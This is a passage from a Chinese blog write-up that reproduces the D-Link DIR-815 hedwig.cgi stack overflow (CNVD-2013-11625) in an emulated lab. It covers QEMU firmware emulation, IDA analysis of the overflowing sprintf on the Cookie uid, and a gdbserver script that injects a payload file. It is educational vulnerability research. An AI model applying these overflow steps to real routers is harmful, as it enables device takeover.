scp: Connection closed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用如下命令即可解决：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ssh-keygen <span class="token parameter variable">-R</span> <span class="token number">192.168</span>.2.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B07.png" alt="CNVD-2013-11625复现7.png"></p><p>在 QEMU 虚拟机中解压：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>root@debian-mipsel<span class="token punctuation">)</span> <span class="token function">tar</span> <span class="token parameter variable">-xzvf</span> DIR-815A1_FW101SSB03_rootfs.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入到路由器文件系统的根目录，新建一个 HTTP 服务的配置文件 <code>http_conf</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> squashfs-root
<span class="token comment"># 因为 QEMU 虚拟机中没有 vi 和 vim 等，但可以使用 nano，这里以 cat 作为示例，cat &gt; 命令使用 ctrl + D 保存并退出</span>
<span class="token function">cat</span> <span class="token operator">&gt;</span> http_conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>写入如下内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Umask 026
PIDFile /var/run/httpd.pid
LogGMT On   <span class="token comment"># 开启 log</span>
ErrorLog /log   <span class="token comment"># log 文件</span>

Tuning <span class="token punctuation">{</span>
    NumConnections <span class="token number">15</span>
    BufSize <span class="token number">12288</span>
    InputBufSize <span class="token number">4096</span>
    ScriptBufSize <span class="token number">4096</span>
    NumHeaders <span class="token number">100</span>
    Timeout <span class="token number">60</span>
    ScriptTimeout <span class="token number">60</span>
<span class="token punctuation">}</span>

Control <span class="token punctuation">{</span>
    Types <span class="token punctuation">{</span>
        text/html <span class="token punctuation">{</span> html htm <span class="token punctuation">}</span>
        text/xml <span class="token punctuation">{</span> xml <span class="token punctuation">}</span>
        text/plain <span class="token punctuation">{</span> txt <span class="token punctuation">}</span>
        image/gif <span class="token punctuation">{</span> gif <span class="token punctuation">}</span>
        image/jpeg <span class="token punctuation">{</span> jpg <span class="token punctuation">}</span>
        text/css <span class="token punctuation">{</span> css <span class="token punctuation">}</span>
        application/octet-stream <span class="token punctuation">{</span> * <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    Specials <span class="token punctuation">{</span>
        Dump <span class="token punctuation">{</span> /dump <span class="token punctuation">}</span>
        CGI <span class="token punctuation">{</span> cgi <span class="token punctuation">}</span>
        Imagemap <span class="token punctuation">{</span> map <span class="token punctuation">}</span>
        Redirect <span class="token punctuation">{</span> url <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    External <span class="token punctuation">{</span>
        /usr/sbin/phpcgi <span class="token punctuation">{</span> php <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

Server <span class="token punctuation">{</span>
    ServerName <span class="token string">"Linux, HTTP/1.1, "</span>
    ServerId <span class="token string">"1234"</span>
    Family inet
    Interface eth0         <span class="token comment"># 网卡</span>
    Address <span class="token number">192.168</span>.2.2    <span class="token comment"># qemu 的 ip 地址</span>
    Port <span class="token string">"4321"</span>            <span class="token comment"># 对应 web 访问端口</span>
    Virtual <span class="token punctuation">{</span>
        AnyHost
        Control <span class="token punctuation">{</span>
            Alias /
            Location /htdocs/web
            IndexNames <span class="token punctuation">{</span> index.php <span class="token punctuation">}</span>
            External <span class="token punctuation">{</span>
                /usr/sbin/phpcgi <span class="token punctuation">{</span> router_info.xml <span class="token punctuation">}</span>
                /usr/sbin/phpcgi <span class="token punctuation">{</span> post_login.xml <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        Control <span class="token punctuation">{</span>
            Alias /HNAP1
            Location /htdocs/HNAP1
            External <span class="token punctuation">{</span>
                /usr/sbin/hnap <span class="token punctuation">{</span> hnap <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            IndexNames <span class="token punctuation">{</span> index.hnap <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 Kali Linux 物理机中新建一个脚本 <code>forwarding.sh</code>，用于开启物理机的网络地址转换（NAT）和 IP 转发（<strong>防止后续在 <code>init.sh</code> 脚本中启动 <code>httpd</code> 服务时出现问题</strong>），写入如下内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
<span class="token function">sudo</span> <span class="token function">sysctl</span> <span class="token parameter variable">-w</span> <span class="token assign-left variable">net.ipv4.ip_forward</span><span class="token operator">=</span><span class="token number">1</span>
<span class="token function">sudo</span> iptables <span class="token parameter variable">-F</span>
<span class="token function">sudo</span> iptables <span class="token parameter variable">-X</span>
<span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> nat <span class="token parameter variable">-F</span>
<span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> nat <span class="token parameter variable">-X</span>
<span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> mangle <span class="token parameter variable">-F</span>
<span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> mangle <span class="token parameter variable">-X</span>
<span class="token function">sudo</span> iptables <span class="token parameter variable">-P</span> INPUT ACCEPT
<span class="token function">sudo</span> iptables <span class="token parameter variable">-P</span> FORWARD ACCEPT
<span class="token function">sudo</span> iptables <span class="token parameter variable">-P</span> OUTPUT ACCEPT
<span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> nat <span class="token parameter variable">-A</span> POSTROUTING <span class="token parameter variable">-o</span> eth0 <span class="token parameter variable">-j</span> MASQUERADE
<span class="token function">sudo</span> iptables <span class="token parameter variable">-I</span> FORWARD <span class="token number">1</span> <span class="token parameter variable">-i</span> tap0 <span class="token parameter variable">-j</span> ACCEPT
<span class="token function">sudo</span> iptables <span class="token parameter variable">-I</span> FORWARD <span class="token number">1</span> <span class="token parameter variable">-o</span> tap0 <span class="token parameter variable">-m</span> state <span class="token parameter variable">--state</span> RELATED,ESTABLISHED <span class="token parameter variable">-j</span> ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 Kali Linux 中执行该脚本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chmod</span> +x forwarding.sh
./forwarding.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>紧接着，在路由器文件系统的根目录下，继续新建一个 <code>init.sh</code> 脚本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> squashfs-root
<span class="token comment"># 因为 QEMU 虚拟机中没有 vi 和 vim 等，但可以使用 nano，这里以 cat 作为示例，cat &gt; 命令使用 ctrl + D 保存并退出</span>
<span class="token function">cat</span> <span class="token operator">&gt;</span> init.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>写入如下内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>

<span class="token comment"># 由于真机不存在地址随机化，因此这里关闭地址随机化</span>
<span class="token builtin class-name">echo</span> <span class="token number">0</span> <span class="token operator">&gt;</span> /proc/sys/kernel/randomize_va_space

<span class="token comment"># 复制配置和二进制文件</span>
<span class="token function">cp</span> http_conf /
<span class="token function">cp</span> sbin/httpd /
<span class="token function">cp</span> <span class="token parameter variable">-rf</span> htdocs/ /

<span class="token comment"># 备份 /etc，防止后续操作改变 /etc 文件夹中的内容导致下一次启动 QEMU 虚拟机出现问题</span>
<span class="token function">mkdir</span> /etc_bak
<span class="token function">cp</span> <span class="token parameter variable">-r</span> /etc /etc_bak
<span class="token function">rm</span> /etc/services
<span class="token function">cp</span> <span class="token parameter variable">-rf</span> etc/ /

<span class="token comment"># 复制必要的库</span>
<span class="token function">cp</span> lib/ld-uClibc-0.9.30.1.so /lib/
<span class="token function">cp</span> lib/libcrypt-0.9.30.1.so /lib/
<span class="token function">cp</span> lib/libc.so.0 /lib/
<span class="token function">cp</span> lib/libgcc_s.so.1 /lib/
<span class="token function">cp</span> lib/ld-uClibc.so.0 /lib/
<span class="token function">cp</span> lib/libcrypt.so.0 /lib/
<span class="token function">cp</span> lib/libgcc_s.so /lib/
<span class="token function">cp</span> lib/libuClibc-0.9.30.1.so /lib/

<span class="token comment"># 删除旧的 CGI 脚本</span>
<span class="token builtin class-name">cd</span> /
<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /htdocs/web/hedwig.cgi
<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /usr/sbin/phpcgi
<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /usr/sbin/hnap

<span class="token comment"># 创建符号链接</span>
<span class="token function">ln</span> <span class="token parameter variable">-s</span> /htdocs/cgibin /htdocs/web/hedwig.cgi
<span class="token function">ln</span> <span class="token parameter variable">-s</span> /htdocs/cgibin /usr/sbin/phpcgi
<span class="token function">ln</span> <span class="token parameter variable">-s</span> /htdocs/cgibin /usr/sbin/hnap

<span class="token comment"># 根据前面配置的 http_conf 文件，启动 HTTP 服务</span>
./httpd <span class="token parameter variable">-f</span> http_conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>赋予 <code>init.sh</code> 执行权限，并运行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x init.sh
./init.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B08.png" alt="CNVD-2013-11625复现8.png"></p><p>访问 <code>http://192.168.2.2:4321/hedwig.cgi</code>，确认 HTTP 服务已经开启：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B09.png" alt="CNVD-2013-11625复现9.png"></p><p>直接浏览器访问提示不支持的 HTTP 请求：<code>"unsupported HTTP request"</code></p><p><strong>最后，在退出 QEMU 虚拟机之前，记得先创建一个 <code>fin.sh</code> 脚本</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> squashfs-root
<span class="token function">cat</span> <span class="token operator">&gt;</span> fin.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>写入如下内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /etc
<span class="token function">mv</span> /etc_bak/etc /etc
<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /etc_bak<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>每次退出 QEMU 虚拟机器之前，都执行一下 <code>fin.sh</code> 脚本，恢复刚刚 <code>init.sh</code> 脚本中更改过的 <code>/etc</code> 文件夹，避免下一次启动 QEMU 时出现问题：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x fin.sh
./fin.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B028.png" alt="CNVD-2013-11625复现28.png"></p><hr><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>在路由器文件系统中找到漏洞文件 <code>hedwig.cgi</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> ./ <span class="token parameter variable">-name</span> hedwig.cgi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B010.png" alt="CNVD-2013-11625复现10.png"></p><p>发现 <code>hedwig.cgi</code> 是一个软链接，指向 <code>cgibin</code> 文件</p><p>在 IDA 下分析 <code>cgibin</code> 文件：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B011.png" alt="CNVD-2013-11625复现11.png"></p><p>定位到漏洞模块 <code>hedwigcgi_main()</code>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B012.png" alt="CNVD-2013-11625复现12.png"></p><p>可以看到我们刚刚访问 <code>http://192.168.2.2:4321/hedwig.cgi</code> 时的报错内容：<code>"unsupported HTTP request"</code></p><p>分析可知，其会读取并判断环境变量 <code>REQUEST_METHOD</code> 是否为 POST，因此只支持 POST 请求方式，刚刚通过浏览器访问是 GET 方式，所以报错</p><p>接下来会执行 <code>cgibin_parse_request(sub_409A6C, 0, 0x20000)</code>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B013.png" alt="CNVD-2013-11625复现13.png"></p><p>这个函数使用到了 3 个环境变量：<code>CONTENT_TYPE</code>、<code>CONTENT_LENGTH</code>、<code>REQUEST_URI</code>，所以后面这三个环境变量我们是必须要设置的</p><p>总的来说，<code>cgibin_parse_request()</code> 函数主要是对 URL 进行分析和处理，这里分析一下：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B014.png" alt="CNVD-2013-11625复现14.png"></p><p>这里定位到 URL 中第一个 <code>'?'</code> 所在的位置，对字符串进行分割，并将 <code>'?'</code> 后的内容和长度传入 <code>sub_402B40()</code> 函数进行处理：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B015.png" alt="CNVD-2013-11625复现15.png"></p><p>这里会再次对字符串以 <code>'&amp;'</code> 和 <code>'='</code> 进行分割，即 URL 格式大致为：<code>aaa?bbb=ccc&amp;ddd</code></p><p><code>hedwigcgi_main()</code> 中再往下走到 <code>sess_get_uid(v4)</code></p><p><code>sess_get_uid()</code> 函数用于从 HTTP 请求的 Cookie 中提取用户的 <code>uid</code>。如果没有找到 <code>uid</code>，则返回用户的远程地址：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B016.png" alt="CNVD-2013-11625复现16.png"></p><p>其判断 <code>uid</code> 的逻辑为：以 <code>'='</code> 作为分隔，<code>'='</code> 前面的内容存入 <code>v2</code>，<code>'='</code> 后面的内容存入 <code>v4</code>，假设原字符串为 <code>uid=xxx</code>，如果 <code>v2 == 'uid'</code>，则 <code>v4 == 'xxx'</code> 就是 <code>uid</code> 数据</p><p>最后将 <code>v4</code> 中的 <code>uid</code> 数据赋值给变量 <code>string</code>，最后将其写入 <code>a1</code>，也就是该函数的形参</p><p>重点在下面：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B017.png" alt="CNVD-2013-11625复现17.png"></p><p>前面 <code>sess_get_uid()</code> 函数会将 <code>uid</code> 写入形参，因此 <code>v4</code> 的值就是 <code>uid</code></p><p>也就是说，<code>sprintf(v27, "%s/%s/postxml", "/runtime/session", string)</code> 中的 <code>string</code> 就是 <code>uid</code>，<strong>而这个 <code>uid</code> 是用户可以控制的</strong></p><p><code>v27</code> 是一个长度为 1024 的字符数组，明显是可以被人为输入的 <code>uid</code> 溢出的：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B018.png" alt="CNVD-2013-11625复现18.png"></p><p>在后面还有一个类似的 <code>sprintf()</code>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B019.png" alt="CNVD-2013-11625复现19.png"></p><p>由于 <code>v4</code> 没有被修改过，因此这里的 <code>v20</code> 同样是 <code>uid</code>，<code>v27</code> 同样可以被溢出</p><p>因此我们可以利用这里覆盖上一次 <code>sprintf()</code> 的内容</p><p>但是要想执行两次 <code>sprintf()</code> 需要满足两个条件判断：</p><ol><li>第一个是需要存在 <code>/var/tmp/</code> 路径，其会创建一个 <code>temp.xml</code> 文件并写入数据</li><li>另一个是要求 <code>haystack</code> 非空</li></ol><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B020.png" alt="CNVD-2013-11625复现20.png"></p><p>首先， <code>/var/tmp/</code> 路径在真实的路由器上是存在的，但是我们仿真的系统里没有：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B021.png" alt="CNVD-2013-11625复现21.png"></p><p>因此为了更真实地模拟环境，我们需要在仿真的系统里自己创建 <code>/var/tmp</code> 文件夹：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B022.png" alt="CNVD-2013-11625复现22.png"></p><p>关于 <code>haystack</code>，通过交叉引用（IDA 快捷键为 X），发现 <code>haystack</code> 在此之前只有 <code>sub_409A6C()</code> 函数进行过修改，也就是 <code>cgibin_parse_request((int)sub_409A6C, 0, 0x20000u)</code> 的第一个参数：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B023.png" alt="CNVD-2013-11625复现23.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B024.png" alt="CNVD-2013-11625复现24.png"></p><p><code>cgibin_parse_request()</code> 函数在这里才调用了 <code>sub_409A6C()</code> 函数（作为形参 <code>a1</code>）：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B025.png" alt="CNVD-2013-11625复现25.png"></p><p><code>off_42C014</code> 处存放的是 <code>"application/"</code> 数据，这是在处理 HTTP 请求时用到的 MIME 类型字符串的一部分：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B026.png" alt="CNVD-2013-11625复现26.png"></p><p>因此这里是对 <code>POST</code> 内容的读入</p><p>要想读入 <code>POST</code>，就必须先满足 <code>v9 != -1</code> 的 <code>if</code> 判断，而 <code>v9</code> 初值就是 <code>-1</code>，因此需要走中间的 <code>if</code> 分支使 <code>v9 = 0</code>，同时也必须保证环境变量 <code>REQUEST_URI</code> 不为空：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B027.png" alt="CNVD-2013-11625复现27.png"></p><p>接下来就是确定 <code>uid</code> 溢出到栈上的返回地址所需要的字节数了，以及 libc 的基地址</p><p>为了使用 gdbserver 进行远程调试，首先交叉编译一个 gdbserver</p><blockquote><p>这一块如果不熟悉的话，详见本站的《<a href="f0cbf9ee.html">IOT固件仿真与gdbserver远程调试</a>》一文的《<a href="f0cbf9ee.html#IOT-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95">IOT 远程调试</a>》部分</p></blockquote><p>由于我本地是 Kali Linux 2024.1 自带 GDB v13.2，因此选择 GDB v13.2 的源码，编译出 <code>mipsel</code> 架构的 gdbserver：（我这里已经提前编译好了，就不再详细说明了）</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B029.png" alt="CNVD-2013-11625复现29.png"></p><p>将其上传到路由器文件系统的根目录下，并增加执行权限：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">scp</span> <span class="token parameter variable">-r</span> gdbserver root@192.168.2.2:~/squashfs-root
<span class="token function">chmod</span> +x gdbserver<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B030.png" alt="CNVD-2013-11625复现30.png"></p><p>在路由器文件系统的根目录下，新建一个 <code>run.sh</code> 脚本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">CONTENT_LENGTH</span><span class="token operator">=</span><span class="token string">"11"</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">CONTENT_TYPE</span><span class="token operator">=</span><span class="token string">"application/x-www-form-urlencoded"</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">HTTP_COOKIE</span><span class="token operator">=</span><span class="token string">"uid=<span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> payload<span class="token variable">`</span></span>"</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">REQUEST_METHOD</span><span class="token operator">=</span><span class="token string">"POST"</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">REQUEST_URI</span><span class="token operator">=</span><span class="token string">"2333"</span>
<span class="token builtin class-name">echo</span> <span class="token string">"winmt=pwner"</span> <span class="token operator">|</span> ./gdbserver <span class="token number">127.0</span>.0.1:6666 /htdocs/web/hedwig.cgi
<span class="token comment"># echo "winmt=pwner" | /htdocs/web/hedwig.cgi</span>
<span class="token builtin class-name">unset</span> CONTENT_LENGTH
<span class="token builtin class-name">unset</span> CONTENT_TYPE
<span class="token builtin class-name">unset</span> HTTP_COOKIE
<span class="token builtin class-name">unset</span> REQUEST_METHOD
<span class="token builtin class-name">unset</span> REQUEST_URI<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>增加执行权限后运行 <code>run.sh</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x run.sh
./run.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B031.png" alt="CNVD-2013-11625复现31.png"></p><p>然后宿主机通过 <code>mipsel-linux-gnu-gdb</code> 远程连接：（由于我用的 gdbserver 就是 GDB v13.2 的源码编译来的，因此直接使用 <code>gdb-multiarch</code> 远程连接也是一样的）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./mipsel-linux-gnu-gdb
<span class="token punctuation">(</span>mipsel-linux-gnu-gdb<span class="token punctuation">)</span> target remote <span class="token number">192.168</span>.2.2:6666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B032.png" alt="CNVD-2013-11625复现32.png"></p><p>连接成功：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B033.png" alt="CNVD-2013-11625复现33.png"></p><p>我们主要是获得 libc 基地址，由于 <code>cgibin</code> 程序没有开启 PIE：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B034.png" alt="CNVD-2013-11625复现34.png"></p><p>直接使用 <code>vmmap</code> 就可以获得基地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 下断点，让程序运行到 main() 函数</span>
<span class="token punctuation">(</span>mipsel-linux-gnu-gdb<span class="token punctuation">)</span> b main
<span class="token punctuation">(</span>mipsel-linux-gnu-gdb<span class="token punctuation">)</span> c

